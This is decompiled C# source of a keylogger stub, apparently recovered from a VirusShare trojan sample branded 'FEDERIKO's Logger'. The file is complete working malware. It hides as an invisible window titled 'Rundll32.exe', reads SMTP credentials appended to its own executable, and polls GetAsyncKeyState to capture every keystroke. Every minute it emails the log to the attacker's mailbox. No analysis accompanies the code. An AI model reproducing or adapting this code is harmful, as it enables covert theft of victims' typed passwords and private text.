// Decompiled with JetBrains decompiler
// Type: Logger_s_Stub.Form1
// Assembly: "Logger's Stub", Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B5C80B7E-89DE-4A6E-B643-BC95296D90B1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Dropper.MSIL.StubRC.gmj-699eff568eb96c6a42edecc22b5a852876d59f87541a0ec72dfd040b93f0bc5d.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Logger_s_Stub
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("TextBox2")]
    private TextBox _TextBox2;
    [AccessedThroughProperty("TextBox3")]
    private TextBox _TextBox3;
    [AccessedThroughProperty("TextBox4")]
    private TextBox _TextBox4;
    [AccessedThroughProperty("TextBox5")]
    private TextBox _TextBox5;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer _Timer3;
    private int result;
    private string LastWindow;
    private long LastHandle;
    private long[] dKey;
    private const int VK_SHIFT = 16;
    private const int VK_CTRL = 17;
    private const int VK_ALT = 18;
    private const int VK_CAPITAL = 20;
    private string[] ChangeChr;
    private bool AltDown;
    private string[] options;
    private string text1;
    private string text2;
    private string text3;
    private string text4;
    private string text5;
    private string numeric;
    private const string FileSplit = "]-FEDERIKO-[";
    private string Lserver;
    private string vDirectory;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.dKey = new long[256];
      this.ChangeChr = new string[256];
      this.Lserver = Path.GetFileName(Application.ExecutablePath);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.TextBox1 = new TextBox();
      this.TextBox2 = new TextBox();
      this.TextBox3 = new TextBox();
      this.TextBox4 = new TextBox();
      this.TextBox5 = new TextBox();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.Timer3 = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      this.TextBox1.Enabled = false;
      TextBox textBox1_1 = this.TextBox1;
      Point point1 = new Point(0, -1);
      Point point2 = point1;
      textBox1_1.Location = point2;
      this.TextBox1.Multiline = true;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_2 = this.TextBox1;
      Size size1 = new Size(100, 81);
      Size size2 = size1;
      textBox1_2.Size = size2;
      this.TextBox1.TabIndex = 0;
      TextBox textBox2_1 = this.TextBox2;
      point1 = new Point(0, 86);
      Point point3 = point1;
      textBox2_1.Location = point3;
      this.TextBox2.Name = "TextBox2";
      TextBox textBox2_2 = this.TextBox2;
      size1 = new Size(100, 20);
      Size size3 = size1;
      textBox2_2.Size = size3;
      this.TextBox2.TabIndex = 1;
      TextBox textBox3_1 = this.TextBox3;
      point1 = new Point(0, 112);
      Point point4 = point1;
      textBox3_1.Location = point4;
      this.TextBox3.Name = "TextBox3";
      this.TextBox3.PasswordChar = '+';
      TextBox textBox3_2 = this.TextBox3;
      size1 = new Size(100, 20);
      Size size4 = size1;
      textBox3_2.Size = size4;
      this.TextBox3.TabIndex = 2;
      TextBox textBox4_1 = this.TextBox4;
      point1 = new Point(0, 138);
      Point point5 = point1;
      textBox4_1.Location = point5;
      this.TextBox4.Name = "TextBox4";
      TextBox textBox4_2 = this.TextBox4;
      size1 = new Size(100, 20);
      Size size5 = size1;
      textBox4_2.Size = size5;
      this.TextBox4.TabIndex = 3;
      TextBox textBox5_1 = this.TextBox5;
      point1 = new Point(0, 164);
      Point point6 = point1;
      textBox5_1.Location = point6;
      this.TextBox5.Name = "TextBox5";
      TextBox textBox5_2 = this.TextBox5;
      size1 = new Size(100, 20);
      Size size6 = size1;
      textBox5_2.Size = size6;
      this.TextBox5.TabIndex = 4;
      this.Timer1.Interval = 1;
      this.Timer2.Interval = 60000;
      this.Timer3.Interval = 1100;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(99, 185);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.TextBox5);
      this.Controls.Add((Control) this.TextBox4);
      this.Controls.Add((Control) this.TextBox3);
      this.Controls.Add((Control) this.TextBox2);
      this.Controls.Add((Control) this.TextBox1);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = "Rundll32.exe";
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual TextBox TextBox2
    {
      [DebuggerNonUserCode] get => this._TextBox2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox2 = value;
    }

    internal virtual TextBox TextBox3
    {
      [DebuggerNonUserCode] get => this._TextBox3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox3 = value;
    }

    internal virtual TextBox TextBox4
    {
      [DebuggerNonUserCode] get => this._TextBox4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox4 = value;
    }

    internal virtual TextBox TextBox5
    {
      [DebuggerNonUserCode] get => this._TextBox5;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox5 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      [DebuggerNonUserCode] get => this._Timer2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
        if (this._Timer2 != null)
          this._Timer2.Tick -= eventHandler;
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      [DebuggerNonUserCode] get => this._Timer3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer3_Tick);
        if (this._Timer3 != null)
          this._Timer3.Tick -= eventHandler;
        this._Timer3 = value;
        if (this._Timer3 == null)
          return;
        this._Timer3.Tick += eventHandler;
      }
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetAsyncKeyState(long vKey);

    private void Form1_Load(object sender, EventArgs e)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        this.ChangeChr[33] = "[PageUp]";
label_2:
        num3 = 3;
        this.ChangeChr[34] = "[PageDown]";
label_3:
        num3 = 4;
        this.ChangeChr[35] = "[End]";
label_4:
        num3 = 5;
        this.ChangeChr[36] = "[Home]";
label_5:
        num3 = 6;
        this.ChangeChr[45] = "[Insert]";
label_6:
        num3 = 7;
        this.ChangeChr[46] = "[Delete]";
label_7:
        num3 = 8;
        this.ChangeChr[48] = "=";
label_8:
        num3 = 9;
        this.ChangeChr[49] = "!";
label_9:
        num3 = 10;
        this.ChangeChr[50] = "'";
label_10:
        num3 = 11;
        this.ChangeChr[51] = "^";
label_11:
        num3 = 12;
        this.ChangeChr[52] = "+";
label_12:
        num3 = 13;
        this.ChangeChr[53] = "%";
label_13:
        num3 = 14;
        this.ChangeChr[54] = "&";
label_14:
        num3 = 15;
        this.ChangeChr[55] = "/";
label_15:
        num3 = 16;
        this.ChangeChr[56] = "(";
label_16:
        num3 = 17;
        this.ChangeChr[57] = ")";
label_17:
        num3 = 18;
        this.ChangeChr[186] = "ş";
label_18:
        num3 = 19;
        this.ChangeChr[187] = "=";
label_19:
        num3 = 20;
        this.ChangeChr[188] = ",";
label_20:
        num3 = 21;
        this.ChangeChr[189] = "-";
label_21:
        num3 = 22;
        this.ChangeChr[190] = ".";
label_22:
        num3 = 23;
        this.ChangeChr[191] = "ö";
label_23:
        num3 = 24;
        this.ChangeChr[219] = "ğ";
label_24:
        num3 = 25;
        this.ChangeChr[220] = "ç";
label_25:
        num3 = 26;
        this.ChangeChr[221] = "ü";
label_26:
        num3 = 27;
        this.ChangeChr[222] = "i";
label_27:
        num3 = 28;
        this.ChangeChr[86] = "Ş";
label_28:
        num3 = 29;
        this.ChangeChr[87] = "+";
label_29:
        num3 = 30;
        this.ChangeChr[88] = ";";
label_30:
        num3 = 31;
        this.ChangeChr[89] = "_";
label_31:
        num3 = 32;
        this.ChangeChr[90] = ":";
label_32:
        num3 = 33;
        this.ChangeChr[91] = "?";
label_33:
        num3 = 34;
        this.ChangeChr[119] = "Ğ";
label_34:
        num3 = 35;
        this.ChangeChr[120] = "Ç";
label_35:
        num3 = 36;
        this.ChangeChr[121] = "Ü";
label_36:
        num3 = 37;
        this.ChangeChr[122] = "İ";
label_37:
        num3 = 38;
        this.ChangeChr[96] = "0";
label_38:
        num3 = 39;
        this.ChangeChr[97] = "1";
label_39:
        num3 = 40;
        this.ChangeChr[98] = "2";
label_40:
        num3 = 41;
        this.ChangeChr[99] = "3";
label_41:
        num3 = 42;
        this.ChangeChr[100] = "4";
label_42:
        num3 = 43;
        this.ChangeChr[101] = "5";
label_43:
        num3 = 44;
        this.ChangeChr[102] = "6";
label_44:
        num3 = 45;
        this.ChangeChr[103] = "7";
label_45:
        num3 = 46;
        this.ChangeChr[104] = "8";
label_46:
        num3 = 47;
        this.ChangeChr[105] = "9";
label_47:
        num3 = 48;
        this.ChangeChr[106] = "*";
label_48:
        num3 = 49;
        this.ChangeChr[107] = "+";
label_49:
        num3 = 50;
        this.ChangeChr[109] = "-";
label_50:
        num3 = 51;
        this.ChangeChr[110] = ".";
label_51:
        num3 = 52;
        this.ChangeChr[111] = "/";
label_52:
        num3 = 53;
        this.ChangeChr[192] = "\"";
label_53:
        num3 = 54;
        this.ChangeChr[92] = "é";
label_54:
        num3 = 55;
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
label_55:
        num3 = 56;
        this.text1 = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_56:
        num3 = 57;
        this.text2 = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_57:
        num3 = 58;
        FileSystem.FileGet(1, ref this.text1);
label_58:
        num3 = 59;
        FileSystem.FileGet(1, ref this.text2);
label_59:
        num3 = 60;
        FileSystem.FileClose(1);
label_60:
        num3 = 61;
        this.options = Strings.Split(this.text1, "]-FEDERIKO-[");
label_61:
        num3 = 62;
        this.TextBox2.Text = this.options[1];
label_62:
        num3 = 63;
        this.TextBox3.Text = this.options[2];
label_63:
        num3 = 64;
        this.TextBox4.Text = this.options[3];
label_64:
        num3 = 65;
        this.TextBox5.Text = this.options[4];
label_65:
        num3 = 66;
        this.Timer1.Start();
label_66:
        num3 = 67;
        this.Timer2.Start();
label_67:
        num3 = 68;
        this.Timer3.Start();
        goto label_74;
label_69:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
                goto label_17;
              case 19:
                goto label_18;
              case 20:
                goto label_19;
              case 21:
                goto label_20;
              case 22:
                goto label_21;
              case 23:
                goto label_22;
              case 24:
                goto label_23;
              case 25:
                goto label_24;
              case 26:
                goto label_25;
              case 27:
                goto label_26;
              case 28:
                goto label_27;
              case 29:
                goto label_28;
              case 30:
                goto label_29;
              case 31:
                goto label_30;
              case 32:
                goto label_31;
              case 33:
                goto label_32;
              case 34:
                goto label_33;
              case 35:
                goto label_34;
              case 36:
                goto label_35;
              case 37:
                goto label_36;
              case 38:
                goto label_37;
              case 39:
                goto label_38;
              case 40:
                goto label_39;
              case 41:
                goto label_40;
              case 42:
                goto label_41;
              case 43:
                goto label_42;
              case 44:
                goto label_43;
              case 45:
                goto label_44;
              case 46:
                goto label_45;
              case 47:
                goto label_46;
              case 48:
                goto label_47;
              case 49:
                goto label_48;
              case 50:
                goto label_49;
              case 51:
                goto label_50;
              case 52:
                goto label_51;
              case 53:
                goto label_52;
              case 54:
                goto label_53;
              case 55:
                goto label_54;
              case 56:
                goto label_55;
              case 57:
                goto label_56;
              case 58:
                goto label_57;
              case 59:
                goto label_58;
              case 60:
                goto label_59;
              case 61:
                goto label_60;
              case 62:
                goto label_61;
              case 63:
                goto label_62;
              case 64:
                goto label_63;
              case 65:
                goto label_64;
              case 66:
                goto label_65;
              case 67:
                goto label_66;
              case 68:
                goto label_67;
              case 69:
                goto label_74;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_69;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_74:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      int num = 1;
      do
      {
        this.result = 0;
        this.result = Form1.GetAsyncKeyState((long) num);
        if (this.result == -32767)
          this.TextBox1.Text += Conversions.ToString(Strings.Chr(num));
        checked { ++num; }
      }
      while (num <= (int) byte.MaxValue);
    }

    private void Timer2_Tick(object sender, EventArgs e) => new SmtpClient(this.TextBox4.Text)
    {
      Port = Conversions.ToInteger(this.TextBox5.Text),
      Credentials = ((ICredentialsByHost) new NetworkCredential(this.TextBox2.Text, this.TextBox3.Text)),
      EnableSsl = true
    }.Send(new MailMessage()
    {
      From = new MailAddress(this.TextBox2.Text),
      To = {
        this.TextBox2.Text
      },
      Subject = "FEDERIKO's Logger - Loglar",
      Body = this.TextBox1.Text
    });

    private void Timer3_Tick(object sender, EventArgs e)
    {
    }
  }
}
